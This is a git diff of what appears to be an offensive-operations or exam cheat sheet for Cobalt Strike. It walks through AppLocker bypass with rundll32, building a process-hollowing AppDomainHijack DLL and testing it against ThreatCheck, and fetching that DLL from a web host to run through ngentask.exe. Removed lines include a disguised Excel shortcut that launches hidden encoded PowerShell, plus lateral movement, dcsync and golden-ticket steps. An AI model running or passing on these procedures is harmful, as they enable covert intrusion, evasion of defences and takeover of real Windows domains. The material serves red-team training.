@@ -9,17 +9,15 @@ The objective is to setup Cobalt Strike.  Update Malleable C2 profile, create ar
 * Add Cobalt Strike Listeners 
 * Load CNA CS Script Manager
 * Generate & Host Payloads
-* AppLocker Bypass Initial access
 * Initial Beacon
+  * Enumerate AppLocker Policy
+  * Download Beacon DLL to Workstation
+  * Execute via rundll32
+  * Process Hollowing AppDomainHijack.dll
 * Connected Beacon Checklist
-* Methodology Gates
-  * Post Exploitation Enumeration
-  * Local Privilege Escalation
-  * Initial Persistence
-  * Active Directory Recon Discovery
-  * Credential Attacks
-  * Lateral Movement
-  * Domain Dominance  
+* [Post Exploitation Enumeration](/cheatsheets/post-exploitation.md) 🚨  
+  * Local Privilege Escalation  
+  
 
 ### SSH to team server
 
@@ -233,13 +231,12 @@ Go to **Cobalt Strike > Listeners > Add** to create a new listener.
 >Script Manager > Load CNA - Aggressor Scripts:  
 
 * C:\Tools\cobaltstrike\arsenal-kit\kits\elevate\elevate.cna
-* C:\Tools\CS-Situational-Awareness-BOF\SA\SA.cna  ← MUST be before exam-recon.cna
+* C:\Tools\CS-Situational-Awareness-BOF\SA\SA.cna
 * C:\Tools\CS-Remote-OPs-BOF\Remote\Remote.cna
 * C:\Tools\cobaltstrike\custom-artifacts\mailslot\artifact.cna
 * C:\Tools\cobaltstrike\custom-resources\resources.cna
 * C:\Tools\Kerbeus-BOF\kerbeus_cs.cna
 * C:\Tools\SQL-BOF\SQL\SQL.cna
-* Optional Custom: exam-recon.cna
 
 ----  
 
@@ -310,10 +307,10 @@ Click Generate.
 Save to C:\Payloads\http_x64.xprocess.bin
 ```
 
-### Build the AppDomainHijack DLL
+### Build AppDomainHijack.dll  
 
->Visual Studio > create > `Class Library (.NET Framework)` and Add the shellcode to the project.
-> Add > Existing Item > `C:\Payloads\http_x64.xprocess.bin` and Properties > Set Build Action > `Embedded Resource`  
+>Visual Studio 2022 > create > `Class Library (.NET Framework)` > Add the shellcode to the project🟡.  
+>Add > Existing Item > `C:\Payloads\http_x64.xprocess.bin` and Properties > Set Build Action > `Embedded Resource`  
 
 >Process Hollowing Malware `Class1.cs`:  
 
@@ -578,38 +575,29 @@ namespace AppDomainHijack
 }
 ```
 
->DLL sideloading with ngentask.exe, and creating a shortcut link:  
+>Build release version `C:\Users\Attacker\source\repos\AppDomainHijack\bin\Release\AppDomainHijack.dll`  
+⚠️ Process Hollowing ⚠️ Above is the process hollowing code from Malware Essentials chapter.  
+
+## ThreatCheck AppDomainHijack.dll  
 
 ```
-cd C:\Payloads\deals
-cp C:\Users\Attacker\source\repos\AppDomainHijack\bin\Release\AppDomainHijack.dll C:\Payloads\deals\
-cp C:\Windows\WinSxS\amd64_netfx4-ngentask_exe_b03f5f7f11d50a3a_4.0.15805.0_none_d4039dd5692796db\ngentask.exe C:\Payloads\deals\
-
-$env:APPDOMAIN_MANAGER_TYPE = 'AppDomainHijack.DomainManager'
-$env:APPDOMAIN_MANAGER_ASM = 'AppDomainHijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null'
-
-.\ngentask.exe
-
-cd C:\Payloads\deals\
-$cmd = '$env:APPDOMAIN_MANAGER_TYPE = "AppDomainHijack.DomainManager"; $env:APPDOMAIN_MANAGER_ASM = "AppDomainHijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null"; .\ngentask.exe'
-$enc = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd))
-
-$wsh = New-Object -ComObject WScript.Shell
-$lnk = $wsh.CreateShortcut("C:\Payloads\deals\deals.xlsx.lnk")
-$lnk.TargetPath = "%COMSPEC%"
-$lnk.Arguments = "/C start deals.xlsx && %SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -enc $enc"
-$lnk.IconLocation = "%ProgramFiles%\Microsoft Office\root\Office16\EXCEL.EXE,0"
-$lnk.Save()
+C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f "C:\Users\Attacker\source\repos\AppDomainHijack\bin\Release\AppDomainHijack.dll"
 ```
 
->[deals.xlsx.lnk](deals.xlsx.lnk)  
+>If ThreatCheck not clean check with Ghidra!  
+>If ThreatCheck clean copy for hosting:  
 
+```
+cp C:\Users\Attacker\source\repos\AppDomainHijack\bin\Release\AppDomainHijack.dll C:\Payloads\
+```
 
-# AppLocker Bypass
+# Initial Beacon
 
->Initial Access, Provided credentials, Locally logged onto compromised workstation  
+>On compromised workstation  
 
 ## Enumerate AppLocker Policy
+
+>Initial Access, Provided credentials, Locally logged onto compromised workstation  
 
 ```powershell
 # Confirm AppLocker is enforcing (ConstrainedLanguage = active)
@@ -619,17 +607,16 @@ $ExecutionContext.SessionState.LanguageMode
 $policy = Get-AppLockerPolicy -Effective
 $policy.RuleCollections
 
-# Check if DLL rules are enforced — empty output = DLL rules OFF = rundll32 viable
+# Check if DLL rules are enforced — empty output = DLL rules OFF = rundll32 viable 💡
 $policy.RuleCollections | Where-Object { $_.RuleCollectionType -eq 'Dll' }
 
 # Find writable dirs inside the allowed %WINDIR%\* path
 icacls C:\Windows\Tasks
+
 icacls C:\Windows\Temp
 ```
 
-# Initial Beacon
-
->On compromised workstation  
+>🚨once bypass path method found to avoid AppLocker proceed to download beacon payload 🚨  
 
 ## Download Beacon DLL to Workstation
 
@@ -650,7 +637,40 @@ rundll32.exe C:\Windows\Tasks\beacon.dll,StartW
 
 <img src="/images/applocker-challenge02.png" width=860>  
 
----
+
+## Process Hollowing 🧨 AppDomainHijack.dll  
+
+>Assume-breach with initial low privilege user beacon💻.  
+>No phishing needed  
+
+
+### Host AppDomainHijack.dll Payload  
+
+```
+Site Management > Host File
+  File:   C:\Payloads\AppDomainHijack.dll
+  URI:    /AppDomainHijack.dll
+  Port:   80
+```
+
+### Download AppDomainHijack.dll & ngentask Execute  
+
+```powershell
+# On foothold workstation — set APPDOMAIN env vars and run ngentask (OPSEC-🟢SAFE)
+
+cd C:\Windows\Tasks\
+Invoke-WebRequest -Uri 'http://www.bleepincomputer.com/AppDomainHijack.dll' -OutFile 'C:\Windows\Tasks\AppDomainHijack.dll'
+
+cp C:\Windows\WinSxS\amd64_netfx4-ngentask_exe_b03f5f7f11d50a3a_4.0.15805.0_none_d4039dd5692796db\ngentask.exe C:\Windows\Tasks\
+
+$env:APPDOMAIN_MANAGER_TYPE = 'AppDomainHijack.DomainManager'
+$env:APPDOMAIN_MANAGER_ASM  = 'AppDomainHijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null'
+
+.\ngentask.exe
+# Beacon appears from msedge.exe
+```
+
+----  
 
 # Connected Beacon Checklist  
 
@@ -663,22 +683,22 @@ sleep 3 20                                      // reduce check-in noise
 ps                                              // get process list
 process_browser                                 // Microsoft Defender/CrowdStrike/SentinelOne/Carbon Black processes → 🔴UNSAFE
 ls / pwd / drives                               // file system context
-ppid <explorer.exe or svchost.exe PID>          // spoof parent — see note below
+
+ppid <explorer.exe PID>                         // spoof parent — see note below
 spawnto x64 %windir%\sysnative\werfault.exe     // override default rundll32
+
 getuid                                          // confirm user context
 netstat                                         // other network connections 
 ```
 
 ----  
 
-# Methodology Gates💡
+# Post Exploitation Enumeration 🔍 
 
-## Post Exploitation Enumeration 🔍 
+>[Post Exploitation Checks🚨](/cheatsheets/post-exploitation.md)  
 
->[Post Exploitation Checks](/cheatsheets/post-exploitation.md)  
-
->commands to execute on workstation
->find other users, local privilege escalation, local workstation persistence, before moving to domain enumeration.  
+>Enumeration commands to execute on workstation
+>Find 🕵️ local privilege, sessions, users, escalation, before moving to domain enumeration.  
 
 ## Local Privilege Escalation 🔥 
 
@@ -686,55 +706,3 @@ netstat                                         // other network connections
 * Weak service registry (powerpick — 🟢SAFE, no spawn)  
 * steal_token from an existing SYSTEM process (🟢SAFE)  
 
-## Initial Persistence 🗝️
-
->Once SYSTEM → get elevated SYSTEM persistence  
->On initial compromised workstation obtain persistence
->[Initial Persistence on first beacon](/labs/Persistence-lab.md)  
-
-## Active Directory Recon Discovery 🕵️ 
-
->[Active Directory Discovery and Enumeration](/labs/Discovery-lab.md)  
-
-1. ldapsearch — users, computers, groups, SPNs, AdminCount=1 objects
-2. ldapsearch — trust objects (find the forest map early)
-3. ldapsearch — ADCS (pKIEnrollmentService objects)
-4. Import logs into BloodHound via BOFHound
-5. Import logs to BloodHound - graph - Identify shortest Domain Admin paths
-  
-## Credential Attacks 🧨
-
-* kerberoast
-* AS-REP roast
-* krb_triage + krb_dump
-* steal_token
-
-## Lateral Movement ⚔️
-
-1. steal_token <pid of target user>  →  jump winrm64 <target> smb       (🟢SAFE)
-2. make_token DOMAIN\user Pass       →  jump winrm64 <target> smb       (🟠CAUTION)
-3. make_token / steal_token          →  jump scshell64 <target> smb     (🟠CAUTION)
-4. remote-exec wmi (if WinRM closed) →  needs payload pre-staged on target (🟠CAUTION)
-5. jump psexec64 — LAST RESORT ONLY, flag the OPSEC cost in your notes  (🔴UNSAFE)  
-
-## Domain Dominance 🎯
-
->When SYSTEM or Admin obtained, then:
-         
-```
-dcsync contoso.com CONTOSO\krbtgt → krbtgt hash → Golden Ticket
-```
-
-```
-ADCS — ESC1/ESC8):
-Enroll → get PFX → Rubeus asktgt /certificate: → inject TGT
-```
-
-```cross-forest
-Trust key via dcsync → inter-realm TGT → access child/parent domains
-```
-
-```
-dcsync CONTOSO\Administrator → for flags and persistence
-Rubeus golden → kerberos_ticket_use → persistent DA access without re-exploiting
-```
